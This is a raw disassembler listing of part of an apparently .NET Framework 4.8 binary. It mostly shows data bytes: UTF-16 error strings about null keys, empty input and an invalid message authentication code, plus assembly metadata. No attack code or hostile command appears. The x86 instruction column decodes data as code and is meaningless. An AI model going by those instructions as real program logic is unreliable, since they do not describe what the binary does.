  40bc5f:	74 00                	je     0x40bc61
  40bc61:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc65:	4b                   	dec    %ebx
  40bc66:	00 65 00             	add    %ah,0x0(%ebp)
  40bc69:	79 00                	jns    0x40bc6b
  40bc6b:	20 00                	and    %al,(%eax)
  40bc6d:	63 00                	arpl   %eax,(%eax)
  40bc6f:	61                   	popa
  40bc70:	00 6e 00             	add    %ch,0x0(%esi)
  40bc73:	20 00                	and    %al,(%eax)
  40bc75:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc76:	00 6f 00             	add    %ch,0x0(%edi)
  40bc79:	74 00                	je     0x40bc7b
  40bc7b:	20 00                	and    %al,(%eax)
  40bc7d:	62 00                	bound  %eax,(%eax)
  40bc7f:	65 00 20             	add    %ah,%gs:(%eax)
  40bc82:	00 6e 00             	add    %ch,0x0(%esi)
  40bc85:	75 00                	jne    0x40bc87
  40bc87:	6c                   	insb   (%dx),%es:(%edi)
  40bc88:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bc8c:	00 6f 00             	add    %ch,0x0(%edi)
  40bc8f:	72 00                	jb     0x40bc91
  40bc91:	20 00                	and    %al,(%eax)
  40bc93:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bc97:	70 00                	jo     0x40bc99
  40bc99:	74 00                	je     0x40bc9b
  40bc9b:	79 00                	jns    0x40bc9d
  40bc9d:	2e 00 00             	add    %al,%cs:(%eax)
  40bca0:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bca5:	70 00                	jo     0x40bca7
  40bca7:	75 00                	jne    0x40bca9
  40bca9:	74 00                	je     0x40bcab
  40bcab:	20 00                	and    %al,(%eax)
  40bcad:	63 00                	arpl   %eax,(%eax)
  40bcaf:	61                   	popa
  40bcb0:	00 6e 00             	add    %ch,0x0(%esi)
  40bcb3:	20 00                	and    %al,(%eax)
  40bcb5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcb6:	00 6f 00             	add    %ch,0x0(%edi)
  40bcb9:	74 00                	je     0x40bcbb
  40bcbb:	20 00                	and    %al,(%eax)
  40bcbd:	62 00                	bound  %eax,(%eax)
  40bcbf:	65 00 20             	add    %ah,%gs:(%eax)
  40bcc2:	00 6e 00             	add    %ch,0x0(%esi)
  40bcc5:	75 00                	jne    0x40bcc7
  40bcc7:	6c                   	insb   (%dx),%es:(%edi)
  40bcc8:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bccc:	00 00                	add    %al,(%eax)
  40bcce:	55                   	push   %ebp
  40bccf:	49                   	dec    %ecx
  40bcd0:	00 6e 00             	add    %ch,0x0(%esi)
  40bcd3:	76 00                	jbe    0x40bcd5
  40bcd5:	61                   	popa
  40bcd6:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bcda:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bcde:	00 6d 00             	add    %ch,0x0(%ebp)
  40bce1:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bce5:	73 00                	jae    0x40bce7
  40bce7:	61                   	popa
  40bce8:	00 67 00             	add    %ah,0x0(%edi)
  40bceb:	65 00 20             	add    %ah,%gs:(%eax)
  40bcee:	00 61 00             	add    %ah,0x0(%ecx)
  40bcf1:	75 00                	jne    0x40bcf3
  40bcf3:	74 00                	je     0x40bcf5
  40bcf5:	68 00 65 00 6e       	push   $0x6e006500
  40bcfa:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bcfe:	00 63 00             	add    %ah,0x0(%ebx)
  40bd01:	61                   	popa
  40bd02:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bd06:	00 6f 00             	add    %ch,0x0(%edi)
  40bd09:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd0a:	00 20                	add    %ah,(%eax)
  40bd0c:	00 63 00             	add    %ah,0x0(%ebx)
  40bd0f:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd10:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bd14:	00 20                	add    %ah,(%eax)
  40bd16:	00 28                	add    %ch,(%eax)
  40bd18:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd1b:	41                   	inc    %ecx
  40bd1c:	00 43 00             	add    %al,0x0(%ebx)
  40bd1f:	29 00                	sub    %eax,(%eax)
  40bd21:	2e 00 00             	add    %al,%cs:(%eax)
  40bd24:	05 58 00 32 00       	add    $0x320058,%eax
  40bd29:	00 0f                	add    %cl,(%edi)
  40bd2b:	7b 00                	jnp    0x40bd2d
  40bd2d:	30 00                	xor    %al,(%eax)
  40bd2f:	3a 00                	cmp    (%eax),%al
  40bd31:	44                   	inc    %esp
  40bd32:	00 33                	add    %dh,(%ebx)
  40bd34:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd37:	20 00                	and    %al,(%eax)
  40bd39:	00 0f                	add    %cl,(%edi)
  40bd3b:	7b 00                	jnp    0x40bd3d
  40bd3d:	30 00                	xor    %al,(%eax)
  40bd3f:	3a 00                	cmp    (%eax),%al
  40bd41:	58                   	pop    %eax
  40bd42:	00 32                	add    %dh,(%edx)
  40bd44:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd47:	20 00                	and    %al,(%eax)
  40bd49:	00 2b                	add    %ch,(%ebx)
  40bd4b:	28 00                	sub    %al,(%eax)
  40bd4d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd4e:	00 65 00             	add    %ah,0x0(%ebp)
  40bd51:	76 00                	jbe    0x40bd53
  40bd53:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd57:	20 00                	and    %al,(%eax)
  40bd59:	75 00                	jne    0x40bd5b
  40bd5b:	73 00                	jae    0x40bd5d
  40bd5d:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bd62:	00 20                	add    %ah,(%eax)
  40bd64:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bd68:	00 70 00             	add    %dh,0x0(%eax)
  40bd6b:	65 00 20             	add    %ah,%gs:(%eax)
  40bd6e:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd71:	63 00                	arpl   %eax,(%eax)
  40bd73:	31 00                	xor    %eax,(%eax)
  40bd75:	00 45 28             	add    %al,0x28(%ebp)
  40bd78:	00 65 00             	add    %ah,0x0(%ebp)
  40bd7b:	78 00                	js     0x40bd7d
  40bd7d:	74 00                	je     0x40bd7f
  40bd7f:	38 00                	cmp    %al,(%eax)
  40bd81:	2c 00                	sub    $0x0,%al
  40bd83:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd87:	74 00                	je     0x40bd89
  40bd89:	31 00                	xor    %eax,(%eax)
  40bd8b:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bd8f:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd93:	33 00                	xor    (%eax),%eax
  40bd95:	32 00                	xor    (%eax),%al
  40bd97:	29 00                	sub    %eax,(%eax)
  40bd99:	20 00                	and    %al,(%eax)
  40bd9b:	74 00                	je     0x40bd9d
  40bd9d:	79 00                	jns    0x40bd9f
  40bd9f:	70 00                	jo     0x40bda1
  40bda1:	65 00 20             	add    %ah,%gs:(%eax)
  40bda4:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bda7:	63 00                	arpl   %eax,(%eax)
  40bda9:	37                   	aaa
  40bdaa:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bdad:	24 00                	and    $0x0,%al
  40bdaf:	63 00                	arpl   %eax,(%eax)
  40bdb1:	38 00                	cmp    %al,(%eax)
  40bdb3:	2c 00                	sub    $0x0,%al
  40bdb5:	24 00                	and    $0x0,%al
  40bdb7:	63 00                	arpl   %eax,(%eax)
  40bdb9:	39 00                	cmp    %eax,(%eax)
  40bdbb:	00 65 50             	add    %ah,0x50(%ebp)
  40bdbe:	3d e4 03 d6 56       	cmp    $0x56d603e4,%eax
  40bdc3:	44                   	inc    %esp
  40bdc4:	9c                   	pushf
  40bdc5:	a2 ed 6f dc 63       	mov    %al,0x63dc6fed
  40bdca:	49                   	dec    %ecx
  40bdcb:	86 00                	xchg   %al,(%eax)
  40bdcd:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  40bdd3:	34 e0                	xor    $0xe0,%al
  40bdd5:	89 03                	mov    %eax,(%ebx)
  40bdd7:	00 00                	add    %al,(%eax)
  40bdd9:	01 03                	add    %eax,(%ebx)
  40bddb:	20 00                	and    %al,(%eax)
  40bddd:	01 02                	add    %eax,(%edx)
  40bddf:	06                   	push   %es
  40bde0:	0e                   	push   %cs
  40bde1:	03 06                	add    (%esi),%eax
  40bde3:	12 09                	adc    (%ecx),%cl
  40bde5:	03 06                	add    (%esi),%eax
  40bde7:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40bdeb:	00 02                	add    %al,(%edx)
  40bded:	03 06                	add    (%esi),%eax
  40bdef:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40bdf5:	03 06                	add    (%esi),%eax
  40bdf7:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40bdfc:	03 06                	add    (%esi),%eax
  40bdfe:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40be04:	06                   	push   %es
  40be05:	1c 02                	sbb    $0x2,%al
  40be07:	06                   	push   %es
  40be08:	08 04 00             	or     %al,(%eax,%eax,1)
  40be0b:	00 12                	add    %dl,(%edx)
  40be0d:	0d 05 00 01 01       	or     $0x1010005,%eax
  40be12:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40be18:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40be1e:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40be21:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40be27:	01 1d 05 03 00 00    	add    %ebx,0x305
  40be2d:	0a 04 00             	or     (%eax,%eax,1),%al
  40be30:	01 01                	add    %eax,(%ecx)
  40be32:	0a 04 00             	or     (%eax,%eax,1),%al
  40be35:	00 12                	add    %dl,(%edx)
  40be37:	15 05 00 01 01       	adc    $0x1010005,%eax
  40be3c:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40be42:	02 03                	add    (%ebx),%al
  40be44:	00 00                	add    %al,(%eax)
  40be46:	1c 03                	sbb    $0x3,%al
  40be48:	00 00                	add    %al,(%eax)
  40be4a:	08 04 00             	or     %al,(%eax,%eax,1)
  40be4d:	01 01                	add    %eax,(%ecx)
  40be4f:	08 04 00             	or     %al,(%eax,%eax,1)
  40be52:	01 02                	add    %eax,(%edx)
  40be54:	0e                   	push   %cs
  40be55:	0a 00                	or     (%eax),%al
  40be57:	04 02                	add    $0x2,%al
  40be59:	1c 12                	sbb    $0x12,%al
  40be5b:	19 12                	sbb    %edx,(%edx)
  40be5d:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40be62:	01 01                	add    %eax,(%ecx)
  40be64:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40be6a:	1c 04                	sbb    $0x4,%al
  40be6c:	08 00                	or     %al,(%eax)
  40be6e:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40be74:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40be77:	00 1d 05 03 08 00    	add    %bl,0x80305
  40be7d:	0a 04 08             	or     (%eax,%ecx,1),%al
  40be80:	00 12                	add    %dl,(%edx)
  40be82:	15 03 08 00 02       	adc    $0x2000803,%eax
  40be87:	03 08                	add    (%eax),%ecx
  40be89:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40be8c:	08 00                	or     %al,(%eax)
  40be8e:	08 03                	or     %al,(%ebx)
  40be90:	00 00                	add    %al,(%eax)
  40be92:	0e                   	push   %cs
  40be93:	04 00                	add    $0x0,%al
  40be95:	01 0e                	add    %ecx,(%esi)
  40be97:	0e                   	push   %cs
  40be98:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40be9e:	d5 0a                	aad    $0xa
  40bea0:	3a 06                	cmp    (%esi),%al
  40bea2:	00 01                	add    %al,(%ecx)
  40bea4:	12 29                	adc    (%ecx),%ch
  40bea6:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40beac:	03 00                	add    (%eax),%eax
  40beae:	00 18                	add    %bl,(%eax)
  40beb0:	07                   	pop    %es
  40beb1:	00 03                	add    %al,(%ebx)
  40beb3:	08 18                	or     %bl,(%eax)
  40beb5:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40bebb:	18 0e                	sbb    %cl,(%esi)
  40bebd:	06                   	push   %es
  40bebe:	00 02                	add    %al,(%edx)
  40bec0:	02 18                	add    (%eax),%bl
  40bec2:	10 02                	adc    %al,(%edx)
  40bec4:	06                   	push   %es
  40bec5:	00 01                	add    %al,(%ecx)
  40bec7:	11 30                	adc    %esi,(%eax)
  40bec9:	11 30                	adc    %esi,(%eax)
  40becb:	06                   	push   %es
  40becc:	00 03                	add    %al,(%ebx)
  40bece:	01 09                	add    %ecx,(%ecx)
  40bed0:	09 09                	or     %ecx,(%ecx)
  40bed2:	02 06                	add    (%esi),%al
  40bed4:	09 03                	or     %eax,(%ebx)
  40bed6:	06                   	push   %es
  40bed7:	11 30                	adc    %esi,(%eax)
  40bed9:	04 00                	add    $0x0,%al
  40bedb:	00 00                	add    %al,(%eax)
  40bedd:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40bee1:	00 00                	add    %al,(%eax)
  40bee3:	04 01                	add    $0x1,%al
  40bee5:	00 00                	add    %al,(%eax)
  40bee7:	00 06                	add    %al,(%esi)
  40bee9:	00 02                	add    %al,(%edx)
  40beeb:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40beee:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40bef3:	0e                   	push   %cs
  40bef4:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bef9:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40befe:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf03:	60                   	pusha
  40bf04:	05 00 01 01 12       	add    $0x12010100,%eax
  40bf09:	60                   	pusha
  40bf0a:	04 00                	add    $0x0,%al
  40bf0c:	01 01                	add    %eax,(%ecx)
  40bf0e:	0e                   	push   %cs
  40bf0f:	18 06                	sbb    %al,(%esi)
  40bf11:	15 12 45 01 15       	adc    $0x15014512,%eax
  40bf16:	12 49 0a             	adc    0xa(%ecx),%cl
  40bf19:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40bf1c:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bf22:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bf27:	0e                   	push   %cs
  40bf28:	04 20                	add    $0x20,%al
  40bf2a:	00 00                	add    %al,(%eax)
  40bf2c:	00 04 40             	add    %al,(%eax,%eax,2)
  40bf2f:	00 00                	add    %al,(%eax)
  40bf31:	00 04 10             	add    %al,(%eax,%edx,1)
  40bf34:	00 00                	add    %al,(%eax)
  40bf36:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bf39:	01 01                	add    %eax,(%ecx)
  40bf3b:	0e                   	push   %cs
  40bf3c:	04 20                	add    $0x20,%al
  40bf3e:	01 0e                	add    %ecx,(%esi)
  40bf40:	0e                   	push   %cs
  40bf41:	06                   	push   %es
  40bf42:	20 01                	and    %al,(%ecx)
  40bf44:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bf49:	20 02                	and    %al,(%edx)
  40bf4b:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bf51:	00 01                	add    %al,(%ecx)
  40bf53:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bf58:	06                   	push   %es
  40bf59:	11 50 03             	adc    %edx,0x3(%eax)
  40bf5c:	06                   	push   %es
  40bf5d:	12 55 05             	adc    0x5(%ebp),%dl
  40bf60:	00 01                	add    %al,(%ecx)
  40bf62:	0e                   	push   %cs
  40bf63:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf68:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bf6d:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bf73:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bf79:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bf7f:	01 01                	add    %eax,(%ecx)
  40bf81:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf86:	60                   	pusha
  40bf87:	03 20                	add    (%eax),%esp
  40bf89:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bf8c:	20 00                	and    %al,(%eax)
  40bf8e:	02 03                	add    (%ebx),%al
  40bf90:	28 00                	sub    %al,(%eax)
  40bf92:	1c 03                	sbb    $0x3,%al
  40bf94:	06                   	push   %es
  40bf95:	12 60 0b             	adc    0xb(%eax),%ah
  40bf98:	20 02                	and    %al,(%edx)
  40bf9a:	01 12                	add    %edx,(%edx)
  40bf9c:	60                   	pusha
  40bf9d:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bfa2:	60                   	pusha
  40bfa3:	04 20                	add    $0x20,%al
  40bfa5:	00 12                	add    %dl,(%edx)
  40bfa7:	60                   	pusha
  40bfa8:	05 20 01 12 60       	add    $0x60120120,%eax
  40bfad:	0e                   	push   %cs
  40bfae:	05 20 01 12 60       	add    $0x60120120,%eax
  40bfb3:	0a 05 20 01 12 60    	or     0x60120120,%al
  40bfb9:	0d 05 20 01 12       	or     $0x12012005,%eax
  40bfbe:	60                   	pusha
  40bfbf:	08 03                	or     %al,(%ebx)
  40bfc1:	20 00                	and    %al,(%eax)
  40bfc3:	08 05 28 01 12 60    	or     %al,0x60120128
  40bfc9:	08 03                	or     %al,(%ebx)
  40bfcb:	28 00                	sub    %al,(%eax)
  40bfcd:	08 03                	or     %al,(%ebx)
  40bfcf:	06                   	push   %es
  40bfd0:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40bfd4:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40bfd8:	01 08                	add    %ecx,(%eax)
  40bfda:	0e                   	push   %cs
  40bfdb:	05 20 01 01 12       	add    $0x12010120,%eax
  40bfe0:	61                   	popa
  40bfe1:	04 20                	add    $0x20,%al
  40bfe3:	01 01                	add    %eax,(%ecx)
  40bfe5:	0a 04 20             	or     (%eax,%eiz,1),%al
  40bfe8:	01 01                	add    %eax,(%ecx)
  40bfea:	0b 03                	or     (%ebx),%eax
  40bfec:	20 00                	and    %al,(%eax)
  40bfee:	0b 03                	or     (%ebx),%eax
  40bff0:	20 00                	and    %al,(%eax)
  40bff2:	0a 03                	or     (%ebx),%al
  40bff4:	20 00                	and    %al,(%eax)
  40bff6:	0d 05 20 01 01       	or     $0x1012005,%eax
  40bffb:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c000:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c005:	01 0e                	add    %ecx,(%esi)
  40c007:	0e                   	push   %cs
  40c008:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c00d:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c010:	01 02                	add    %eax,(%edx)
  40c012:	0e                   	push   %cs
  40c013:	03 20                	add    (%eax),%esp
  40c015:	00 0e                	add    %cl,(%esi)
  40c017:	04 20                	add    $0x20,%al
  40c019:	01 01                	add    %eax,(%ecx)
  40c01b:	02 04 20             	add    (%eax,%eiz,1),%al
  40c01e:	01 01                	add    %eax,(%ecx)
  40c020:	0c 04                	or     $0x4,%al
  40c022:	20 01                	and    %al,(%ecx)
  40c024:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c02a:	5c                   	pop    %esp
  40c02b:	04 20                	add    $0x20,%al
  40c02d:	00 11                	add    %dl,(%ecx)
  40c02f:	64 04 20             	fs add $0x20,%al
  40c032:	00 12                	add    %dl,(%edx)
  40c034:	59                   	pop    %ecx
  40c035:	03 28                	add    (%eax),%ebp
  40c037:	00 0e                	add    %cl,(%esi)
  40c039:	03 28                	add    (%eax),%ebp
  40c03b:	00 0a                	add    %cl,(%edx)
  40c03d:	03 28                	add    (%eax),%ebp
  40c03f:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c045:	5c                   	pop    %esp
  40c046:	04 28                	add    $0x28,%al
  40c048:	00 11                	add    %dl,(%ecx)
  40c04a:	64 04 00             	fs add $0x0,%al
  40c04d:	00 00                	add    %al,(%eax)
  40c04f:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c052:	00 00                	add    %al,(%eax)
  40c054:	00 04 04             	add    %al,(%esp,%eax,1)
  40c057:	00 00                	add    %al,(%eax)
  40c059:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c060:	06                   	push   %es
  40c061:	00 00                	add    %al,(%eax)
  40c063:	00 04 07             	add    %al,(%edi,%eax,1)
  40c066:	00 00                	add    %al,(%eax)
  40c068:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c06b:	00 00                	add    %al,(%eax)
  40c06d:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c070:	00 00                	add    %al,(%eax)
  40c072:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c075:	00 00                	add    %al,(%eax)
  40c077:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c07a:	00 00                	add    %al,(%eax)
  40c07c:	00 06                	add    %al,(%esi)
  40c07e:	00 02                	add    %al,(%edx)
  40c080:	0e                   	push   %cs
  40c081:	12 61 08             	adc    0x8(%ecx),%ah
  40c084:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c089:	61                   	popa
  40c08a:	06                   	push   %es
  40c08b:	00 02                	add    %al,(%edx)
  40c08d:	0e                   	push   %cs
  40c08e:	05 12 61 05 00       	add    $0x56112,%eax
  40c093:	01 01                	add    %eax,(%ecx)
  40c095:	12 61 06             	adc    0x6(%ecx),%ah
  40c098:	00 02                	add    %al,(%edx)
  40c09a:	01 12                	add    %edx,(%edx)
  40c09c:	61                   	popa
  40c09d:	0e                   	push   %cs
  40c09e:	07                   	pop    %es
  40c09f:	00 02                	add    %al,(%edx)
  40c0a1:	01 12                	add    %edx,(%edx)
  40c0a3:	61                   	popa
  40c0a4:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c0a9:	01 12                	add    %edx,(%edx)
  40c0ab:	61                   	popa
  40c0ac:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c0b1:	12 61 0c             	adc    0xc(%ecx),%ah
  40c0b4:	06                   	push   %es
  40c0b5:	00 02                	add    %al,(%edx)
  40c0b7:	01 12                	add    %edx,(%edx)
  40c0b9:	61                   	popa
  40c0ba:	02 06                	add    (%esi),%al
  40c0bc:	00 02                	add    %al,(%edx)
  40c0be:	01 12                	add    %edx,(%edx)
  40c0c0:	61                   	popa
  40c0c1:	0b 06                	or     (%esi),%eax
  40c0c3:	00 02                	add    %al,(%edx)
  40c0c5:	01 12                	add    %edx,(%edx)
  40c0c7:	61                   	popa
  40c0c8:	0a 03                	or     (%ebx),%al
  40c0ca:	06                   	push   %es
  40c0cb:	11 78 04             	adc    %edi,0x4(%eax)
  40c0ce:	20 01                	and    %al,(%ecx)
  40c0d0:	01 08                	add    %ecx,(%eax)
  40c0d2:	08 01                	or     %al,(%ecx)
  40c0d4:	00 08                	add    %cl,(%eax)
  40c0d6:	00 00                	add    %al,(%eax)
  40c0d8:	00 00                	add    %al,(%eax)
  40c0da:	00 1e                	add    %bl,(%esi)
  40c0dc:	01 00                	add    %eax,(%eax)
  40c0de:	01 00                	add    %eax,(%eax)
  40c0e0:	54                   	push   %esp
  40c0e1:	02 16                	add    (%esi),%dl
  40c0e3:	57                   	push   %edi
  40c0e4:	72 61                	jb     0x40c147
  40c0e6:	70 4e                	jo     0x40c136
  40c0e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0e9:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0ea:	45                   	inc    %ebp
  40c0eb:	78 63                	js     0x40c150
  40c0ed:	65 70 74             	gs jo  0x40c164
  40c0f0:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c0f7:	77 73                	ja     0x40c16c
  40c0f9:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c0ff:	71 08                	jno    0x40c109
  40c101:	01 00                	add    %eax,(%eax)
  40c103:	02 00                	add    (%eax),%al
  40c105:	00 00                	add    %al,(%eax)
  40c107:	00 00                	add    %al,(%eax)
  40c109:	05 01 00 00 00       	add    $0x1,%eax
  40c10e:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c111:	00 07                	add    %al,(%edi)
  40c113:	31 2e                	xor    %ebp,(%esi)
  40c115:	30 2e                	xor    %ch,(%esi)
  40c117:	30 2e                	xor    %ch,(%esi)
  40c119:	30 00                	xor    %al,(%eax)
  40c11b:	00 49 01             	add    %cl,0x1(%ecx)
  40c11e:	00 1a                	add    %bl,(%edx)
  40c120:	2e 4e                	cs dec %esi
  40c122:	45                   	inc    %ebp
  40c123:	54                   	push   %esp
  40c124:	46                   	inc    %esi
  40c125:	72 61                	jb     0x40c188
  40c127:	6d                   	insl   (%dx),%es:(%edi)
  40c128:	65 77 6f             	gs ja  0x40c19a
  40c12b:	72 6b                	jb     0x40c198
  40c12d:	2c 56                	sub    $0x56,%al
  40c12f:	65 72 73             	gs jb  0x40c1a5
  40c132:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c139:	38 01                	cmp    %al,(%ecx)
  40c13b:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40c13f:	46                   	inc    %esi
  40c140:	72 61                	jb     0x40c1a3
  40c142:	6d                   	insl   (%dx),%es:(%edi)
  40c143:	65 77 6f             	gs ja  0x40c1b5
  40c146:	72 6b                	jb     0x40c1b3
  40c148:	44                   	inc    %esp
  40c149:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c150:	61                   	popa
  40c151:	6d                   	insl   (%dx),%es:(%edi)
  40c152:	65 12 2e             	adc    %gs:(%esi),%ch
  40c155:	4e                   	dec    %esi
  40c156:	45                   	inc    %ebp
  40c157:	54                   	push   %esp
  40c158:	20 46 72             	and    %al,0x72(%esi)
  40c15b:	61                   	popa
  40c15c:	6d                   	insl   (%dx),%es:(%edi)
  40c15d:	65 77 6f             	gs ja  0x40c1cf
  40c160:	72 6b                	jb     0x40c1cd
  40c162:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40c165:	38 09                	cmp    %cl,(%ecx)
  40c167:	01 00                	add    %eax,(%eax)
  40c169:	04 49                	add    $0x49,%al
  40c16b:	74 65                	je     0x40c1d2
  40c16d:	6d                   	insl   (%dx),%es:(%edi)
  40c16e:	00 00                	add    %al,(%eax)
  40c170:	03 07                	add    (%edi),%eax
  40c172:	01 08                	add    %ecx,(%eax)
  40c174:	04 00                	add    $0x0,%al
  40c176:	01 08                	add    %ecx,(%eax)
  40c178:	0e                   	push   %cs
  40c179:	03 07                	add    (%edi),%eax
  40c17b:	01 02                	add    %eax,(%edx)
  40c17d:	05 00 00 12 80       	add    $0x80120000,%eax
  40c182:	b1 05                	mov    $0x5,%cl
  40c184:	20 01                	and    %al,(%ecx)
  40c186:	0e                   	push   %cs
  40c187:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c18c:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c192:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c198:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c19d:	03 02                	add    (%edx),%eax
  40c19f:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c1a4:	14 07                	adc    $0x7,%al
  40c1a6:	08 0e                	or     %cl,(%esi)
  40c1a8:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c1ae:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c1b4:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c1ba:	20 03                	and    %al,(%ebx)
  40c1bc:	01 11                	add    %edx,(%ecx)
  40c1be:	80 d5 11             	adc    $0x11,%ch
  40c1c1:	80 d9 11             	sbb    $0x11,%cl
  40c1c4:	80 dd 05             	sbb    $0x5,%ch
  40c1c7:	00 02                	add    %al,(%edx)
  40c1c9:	02 0e                	add    (%esi),%cl
  40c1cb:	0e                   	push   %cs
  40c1cc:	06                   	push   %es
  40c1cd:	20 01                	and    %al,(%ecx)
  40c1cf:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c1d4:	20 01                	and    %al,(%ecx)
  40c1d6:	08 08                	or     %cl,(%eax)
  40c1d8:	07                   	pop    %es
  40c1d9:	00 01                	add    %al,(%ecx)
  40c1db:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c1e0:	07                   	pop    %es
  40c1e1:	20 02                	and    %al,(%edx)
  40c1e3:	01 12                	add    %edx,(%edx)
  40c1e5:	80 c9 08             	or     $0x8,%cl
  40c1e8:	06                   	push   %es
  40c1e9:	20 01                	and    %al,(%ecx)
  40c1eb:	01 12                	add    %edx,(%edx)
  40c1ed:	80 f1 09             	xor    $0x9,%cl
  40c1f0:	20 02                	and    %al,(%edx)
  40c1f2:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c1f7:	80 f5 05             	xor    $0x5,%ch
  40c1fa:	20 02                	and    %al,(%edx)
  40c1fc:	08 08                	or     %cl,(%eax)
  40c1fe:	08 06                	or     %al,(%esi)
  40c200:	20 02                	and    %al,(%edx)
  40c202:	01 12                	add    %edx,(%edx)
  40c204:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c209:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c20c:	09 20                	or     %esp,(%eax)
